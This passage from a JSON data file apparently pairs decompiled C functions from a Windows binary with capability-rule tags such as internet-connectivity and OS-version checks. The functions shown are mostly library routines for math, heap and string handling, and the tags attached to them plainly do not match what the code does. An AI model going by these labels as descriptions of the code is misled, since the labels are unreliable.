if (iVar2 == -1) {\n                    *arg_ch = arg_8h_00;\n                    puVar3 = fcn.00403a35();\n                    *puVar3 = 0x2a;\n                    return -1;\n                }\n                if (iVar2 == 0) {\n                    arg_8h_00 = 0;\n                    *puVar5 = 0;\n                    break;\n                }\n                uVar4 = var_8h;\n                if (0xffff < var_8h) {\n                    if (arg_10h < 2) break;\n                    var_8h = var_8h - 0x10000;\n                    arg_10h = arg_10h - 1;\n                    *puVar5 = var_8h >> 10 | 0xd800;\n                    puVar5 = puVar5 + 1;\n                    uVar4 = var_8h & 0x3ff | 0xdc00;\n                }\n                *puVar5 = uVar4;\n                arg_8h_00 = arg_8h_00 + iVar2;\n                puVar5 = puVar5 + 1;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n        }\n        iVar6 = puVar5 - arg_8h >> 1;\n        *arg_ch = arg_8h_00;\n    }\n    return iVar6;\n}\n",
        "token_count": 735
    },
    "004061f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004061f4(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451000;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 3;\n    fcn.00401e79(\"dugcwcwnjrellazxcqizbyehx\");\n    for (var_40h = 0x17; 0 < var_40h; var_40h = var_40h + -1) {\n    }\n    var_10h = 4;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 331
    },
    "00406212": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406212(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    ushort uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    arg_10h = in_ECX + 0x2c;\n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar2 = *(arg_ch + 0x10);\n    }\n    else {\n        uVar2 = *(arg_ch + 0xc);\n    }\n    uVar2 = fcn.004030a3(uVar2, 0, arg_10h);\n    *(in_ECX + 0x10) = uVar2;\n    uVar2 = 0x552647;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar2 = *(arg_ch + 0x20);\n    }\n    uVar2 = fcn.004030a3(uVar2, 0, arg_10h);\n    *(in_ECX + 0x14) = uVar2;\n    uVar2 = 0x554974;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar2 = *(arg_ch + 0x24);\n    }\n    uVar2 = fcn.004030a3(uVar2, 0, arg_10h);\n    *(in_ECX + 0x18) = uVar2;\n    uVar1 = fcn.00405015(**(arg_ch + 0x14), 0, arg_10h);\n    *(in_ECX + 0xc) = uVar1;\n    uVar1 = fcn.00405015(**(arg_ch + 0x18), 0, arg_10h);\n    *(in_ECX + 0xe) = uVar1;\n    return;\n}\n",
        "token_count": 420
    },
    "00406217": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406217(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405f24(0, 0);\n    if (iVar1 == 0) {\n        iVar1 = 0x552647;\n    }\n    fcn.00404c00(iVar1);\n    if (arg_ch != 0) {\n        iVar1 = fcn.00405f24(0, arg_ch);\n        if (iVar1 != 0) goto code_r0x00465a1a;\n    }\n    iVar1 = 0x553c10;\ncode_r0x00465a1a:\n    fcn.00404c00(iVar1);\n    return;\n}\n",
        "token_count": 168
    },
    "00406299": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406299(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 247
    },
    "004062ee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004062ee(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    \n    if (*(arg_ch + 4) != '\\0') {\n        puVar1 = fcn.004048a9();\n        *puVar1 = 0;\n        puVar1[1] = arg_8h << 0x1f;\n        return;\n    }\n    piVar2 = fcn.0040184d();\n    *piVar2 = arg_8h << 0x1f;\n    return;\n}\n",
        "token_count": 136
    },
    "00406311": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004e1309)\n\nfloat10 fcn.00406311(double param_1)\n\n{\n    uint32_t arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 fVar4;\n    double dVar5;\n    int64_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    arg_ch = param_1 >> 0x20;\n    if (*0x575754 != 0) {\n        bVar3 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar3) {\n            bVar3 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar3) {\n            uVar1 = arg_ch >> 0x14;\n            iVar6 = CONCAT44(*0x561be4, *0x561be0 - (arg_ch >> 0x14 & *0x561c00));\n            if ((uVar1 & 0x800) == 0) {\n                dVar5 = (param_1 >> iVar6) << iVar6;\n                if (uVar1 < 0x3ff) {\n                    return -(*0x561bf0 < param_1) & *0x561bd0;\n                }\n                if (uVar1 < 0x433) {\n                    return dVar5 + (-(dVar5 < param_1) & *0x561bd0);\n                }\n            }\n            else {\n                if (uVar1 < 0xbff) {\n                    return *0x561c10;\n                }\n                if (uVar1 < 0xc33) {\n                    return (param_1 >> iVar6) << iVar6;\n                }\n            }\n            return param_1;\n        }\n    }\n    uVar1 = fcn.0040524f(0x1b3f, 0xffff);\n    if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {\n        iVar2 = fcn.00405268(SUB84(param_1, 0), arg_ch);\n        if (2 < iVar2 - 1U) {\n            uVar8 = SUB84(*0x555f70 + param_1, 0);\n            uVar9 = *0x555f70 + param_1 >> 0x20;\n            uVar7 = 8;\ncode_r0x004e220c:\n            fVar4 = fcn.0040569b(uVar7, 0xc, param_1, uVar8, uVar9, uVar1);\n            return fVar4;\n        }\n        fcn.0040524f(uVar1, 0xffff);\n        dVar5 = param_1;\n    }\n    else {\n        fVar4 = fcn.004015cd();\n        dVar5 = fVar4;\n        if ((param_1 != fVar4) && ((uVar1 & 0x20) == 0)) {\n            uVar8 = SUB84(fVar4, 0);\n            uVar9 = fVar4 >> 0x20;\n            uVar7 = 0x10;\n            goto code_r0x004e220c;\n        }\n        fcn.0040524f(uVar1, 0xffff);\n    }\n    return dVar5;\n}\n",
        "token_count": 786
    },
    "0040634d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040634d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EBP;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00405434(0x44);\n    piVar2 = *(unaff_EBP + 0x14);\n    iVar7 = 0;\n    iVar10 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    iVar5 = *piVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    iVar1 = iVar5;\n    while (iVar1 != 0) {\n        if (iVar1 == iVar5) {\n            iVar10 = iVar10 + 1;\n        }\n        iVar7 = iVar7 + 1;\n        iVar1 = piVar2[iVar7];\n    }\n    *(unaff_EBP + -0x3c) = iVar10;\n    fcn.0040375b(iVar10, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404f70(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.00403e2c(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.00405146();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar9 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar11 = 0;\n        iVar10 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            iVar5 = piVar2[iVar10];\n            if (iVar5 != 0) {\n                do {\n                    if (iVar5 == *piVar2) break;\n                    iVar10 = iVar10 + 1;\n                    iVar5 = piVar2[iVar10];\n                } while (iVar5 != 0);\n            }\n            bVar12 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar11) == '\\0') {\n                iVar10 = iVar10 + uVar9;\n                if ((piVar2[iVar10] == *piVar2) || (piVar2[iVar10] == 0)) {\n                    if (0x7e < uVar9) {\n                        uVar9 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar12) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar9;\n                    uVar9 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar11;\n                    goto code_r0x0046a04d;\n                }\n                cVar4 = fcn.0040650f(*(unaff_EBP + -0x48));\n                if (cVar4 != '\\0') {\ncode_r0x0046a012:\n                    uVar9 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar9;\n                    if (0x7e < uVar9) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar8;\n                    goto code_r0x0046a04d;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.00405141();\n                    }\n                    bVar12 = piVar2[iVar10] == *(*(unaff_EBP + -0x34) + 6);\n                }\n                else {\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x578000)(piVar2[iVar10]);\n                    uVar9 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x4c) = uVar9 & 0xffff;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.00405141();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x578000)(*(iVar7 + 6));\n                    iVar5 = (*pcVar3)();\n                    uVar11 = *(unaff_EBP + -0x44);\n                    bVar12 = *(unaff_EBP + -0x4c) == iVar5;\n                }\n                if (!bVar12) goto code_r0x0046a012;\n                uVar9 = *(unaff_EBP + -0x30);\n                cVar4 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar12) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar10 = iVar10 + *(iVar7 + uVar11);\ncode_r0x0046a04d:\n                cVar4 = *(unaff_EBP + -0x29);\n            }\n            uVar11 = uVar11 + 1;\n            *(unaff_EBP + -0x44) = uVar11;\n        } while (uVar11 < *(unaff_EBP + -0x3c));\n        if ((cVar4 == '\\0') || (cVar4 = fcn.0040650f(*(unaff_EBP + -0x48)),  cVar4 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.004027f7();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar9 = *(unaff_EBP + -0x30);\n    }\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 1787
    },
    "0040636b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040636b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, double *arg_18h)\n\n{\n    double dVar1;\n    double dVar2;\n    int32_t iVar3;\n    \n    dVar1 = ABS(CONCAT44(arg_ch, arg_8h));\n    dVar2 = *0x558930;\n    if (arg_14h == 0x7ff00000) {\n        if (arg_10h == 0) {\n            if ((dVar1 <= 1.0) && (dVar2 = 1.0,  ((1.0 < dVar1) << 8 | (dVar1 == 1.0) << 0xe) == 0)) {\n                dVar2 = 0.0;\n            }\n            goto code_r0x004d6d66;\n        }\n    }\n    else if ((arg_14h == -0x100000) && (arg_10h == 0)) {\n        if (dVar1 <= 1.0) {\n            dVar2 = 1.0;\n            if (((1.0 < dVar1) << 8 | (dVar1 == 1.0) << 0xe) == 0) {\n                dVar2 = *0x558930;\n            }\n        }\n        else {\n            dVar2 = 0.0;\n        }\n        goto code_r0x004d6d66;\n    }\n    if (arg_ch == 0x7ff00000) {\n        if (arg_8h != 0) {\n            return 0;\n        }\n        dVar1 = CONCAT44(arg_14h, arg_10h);\n        if ((((dVar1 < 0.0) << 8 | (dVar1 == 0.0) << 0xe) != 0) && (dVar2 = 0.0,  0.0 <= dVar1)) {\n            dVar2 = 1.0;\n        }\n    }\n    else {\n        if (arg_ch != -0x100000) {\n            return 0;\n        }\n        if (arg_8h != 0) {\n            return 0;\n        }\n        iVar3 = fcn.004043f4(CONCAT44(arg_14h, arg_10h));\n        dVar1 = CONCAT44(arg_14h, arg_10h);\n        if (((dVar1 < 0.0) << 8 | (dVar1 == 0.0) << 0xe) == 0) {\n            dVar2 = *0x558930;\n            if (iVar3 == 1) {\n                dVar2 = -*0x558930;\n            }\n        }\n        else if (0.0 <= dVar1) {\n            dVar2 = 1.0;\n        }\n        else {\n            dVar2 = 0.0;\n            if (iVar3 == 1) {\n                dVar2 = *0x558970;\n            }\n        }\n    }\ncode_r0x004d6d66:\n    *arg_18h = dVar2;\n    return 0;\n}\n",
        "token_count": 708
    },
    "004063ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004063ca(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "004063fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004063fc(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "0040640b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040640b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x5755b8, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00403a35();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00404958(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00406433": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00406433(uint arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffb4;\n    var_10h = 0xffffffff;\n    var_14h = 0x4271e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.0040620d(0);\n    var_24h = *0x573bd4;\n    arg_8h_01 = fcn.004052f4();\n    var_10h = 0;\n    var_2ch = fcn.00402171(arg_8h_01);\n    if (var_2ch == NULL) {\n        if (var_24h == NULL) {\n            iVar1 = fcn.00403b2a(&var_24h, arg_8h);\n            if (iVar1 == -1) {\n                fcn.004058b7();\n            }\n            arg_8h_00 = var_24h;\n            fcn.00403e59(var_24h);\n            var_10h = 1;\n            fcn.004023e2(arg_8h_00);\n            (**(*arg_8h_00 + 4))();\n            *0x573bd4 = var_24h;\n            var_2ch = var_24h;\n            fcn.004058e4();\n            fcn.0040153c();\n        }\n        else {\n            var_2ch = var_24h;\n        }\n    }\n    fcn.004036f2();\n    *in_FS_OFFSET = var_18h;\n    return var_2ch;\n}\n",
        "token_count": 506
    },
    "00406442": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406442(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 240
    },
    "004064f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004064f6(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "004064fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004064fb(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t in_MXCSR;\n    uint var_4h;\n    \n    if ((*0x573c4c < 1) || ((arg_8h != -0x3ffffd4c && (arg_8h != -0x3ffffd4b)))) {\n        return arg_8h;\n    }\n    uVar1 = in_MXCSR ^ 0x3f;\n    if ((uVar1 & 0x81) != 0) {\n        if ((uVar1 & 0x204) == 0) {\n            return -0x3fffff72;\n        }\n        if ((uVar1 & 0x102) != 0) {\n            if ((uVar1 & 0x408) == 0) {\n                return -0x3fffff6f;\n            }\n            if ((uVar1 & 0x810) != 0) {\n                if ((uVar1 & 0x1020) != 0) {\n                    return arg_8h;\n                }\n                return -0x3fffff71;\n            }\n            return -0x3fffff6d;\n        }\n    }\n    return -0x3fffff70;\n}\n",
        "token_count": 291
    },
    "0040650f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040650f(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.00405141();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.00405141();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 140
    },
    "0040658c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040658c(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) < '\\x02') {\n        if (((*in_ECX == 0) || (arg_8h == 2)) || (arg_8h == 3)) {\n            fcn.00402eb9(arg_8h);\n        }\n        else if (arg_8h != 0) {\n            arg_8h_00 = fcn.0040493a(arg_8h);\n            fcn.00405713(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "004065c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.004065c8(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar2 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    